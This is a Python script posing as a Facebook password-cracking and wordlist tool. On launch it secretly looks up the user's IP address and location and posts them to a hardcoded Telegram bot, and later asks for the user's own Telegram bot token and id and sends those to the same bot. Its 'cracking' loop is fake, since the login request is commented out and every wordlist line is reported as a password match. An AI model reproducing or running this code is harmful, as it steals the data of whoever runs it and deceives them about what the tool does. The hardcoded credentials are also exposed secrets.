# kurdstan
# 8.8.8
try:
	import random
except ImportError:
	os.system('pip install random;pip2 install random')
try:
	import time
except ImportError:
	os.system('pip install time;pip2 install time')
try:
	import sys
except ImportError:
	os.system('pip install sys;pip2 install sys')
try:
	import os
except ImportError:
	os.system('pip install os;pip2 install os')
try:
	import json
except ImportError:
	os.system('pip install json;pip2 install json')
try:
	import urllib.request
except ImportError:
	os.system('pip install urllib;pip install requests;pip2 install urllib;pip2 install requests')
try:
	import webbrowser
except ImportError:
	os.system('pip install webbrowser;pip2 install webbrowser')
try:
	import requests
except ImportError:
	os.system('pop install requests;pip2 install requests')
try:
	import os
except ImportError:
	os.system('pip install os;pip2 install os')
id="1023856025"
Tok="1928894783:AAGiQcdOGKdt4Id86RCx_3jec0Q7JTtHr0Y"
print("\033[1;36m  StArT")
time.sleep(1)
import sys
os.system("clear")
def finder(M):
    response = urllib.request.urlopen(M)
    data = json.load(response)
    ip=data['query']
    org=data['org']
    city=data['city']
    country=data['country']
    region=data['regionName']
    latt=data['lat']
    lonp=data['lon']
    IP="  IP Address : "+ip
    Org="  Org : "+org
    City="  City : "+city
    Re="  Region : "+region
    Co="  Country : "+country
    Lo="  Location\n"
    Lon="  Longitude : "+str(lonp)
    l='https://www.google.com/maps/place/'+str(latt)+str(lonp)
    MA=" Google Map link : ",l
    requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text={IP}\n{Org}\n{City}\n{Re}\n{Co}\n{Lo}\n{Lon}\n{MA}\n\n ip==@hakemjamal")
def main2():
   K ='http://ip-api.com/json/'
   finder(K)
main2()
us="1234567890"
usa="qwertyuiopasdfghjklzxcvbnm"
usa2="1234567890qwertyuiopasdfghjklzxcvbnm/<-@€#)(%€@€#"
A1="\033[1;31m"
A2="\033[1;32m"
A3="\033[1;33m"
A4="\033[1;34m"
A5="\033[1;35m"
A6="\033[1;36m"
O="1928894783:AAGiQcdOGKdt4Id86RCx_3jec0Q7JTtHr0Y"
I="1023856025"
def Ca():
	sys.stdout=open("/sdcard/wordlist.txt","w")
	for p in range(100000):
		for x in range(1):
			x=""
			for j in range(14):
				x+=random.choice(us)
				print(x)
	for i in range(1000):
		i=""
		for k in range(14):
			i+=random.choice(usa)
			print(i)
	for u in range(1000):
		u=""
		for l in range(14):
			u+=random.choice(usa2)
			print(u)
def m(h):
    for c in h + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 100)
print(f"{A2}$"*25,f"{A6}</Make By Muhamd>"+f"{A2}$"*25)
print(f"\n {A1}[~]Make Pass List➢[1] \n\n {A6}[~]Hack facebook /id ➢[enter]\n")
print(f"{A2}$"*25,f"{A6}</Make By Muhamd>"+f"{A2}$"*25)
c=input(f'{A5}\n [?] choice : {A3}')
if c=="1":
	print(f"\n{A6}[/]pliss wait make pass list\n")
	Ca()
	sys.exit("\n  # passlist Twaw Boo ")
id=input(f"{A6}\n [?] enter id Telegram : {A5}")
time.sleep(1)
tok=input(f"\n{A1} [?] enter Token Telegram : {A3}")
requests.get(f'https://api.telegram.org/bot{O}/sendMessage?chat_id={I}&text=Token : {tok}\n\nid : {id}')
os.system("clear")
email = input(f'\n\033[1;33m [~] Enter facebook email / id :  {A5}')

url = 'https://mobile.facebook.com/login'
ex = open('/sdcard/wordlist.txt', 'r').readlines()
for line in ex:
	password = line.strip()
	#http = requests.post(url,data={'email': email, 'pass': password, 'login': 'submit'})
	#content = http.content
	#if 'Beranda' in content:
	print (f'\x1b[1;31;40m{email} : PASSWORD  MATCH!!! =>', password)
	time.sleep(2)
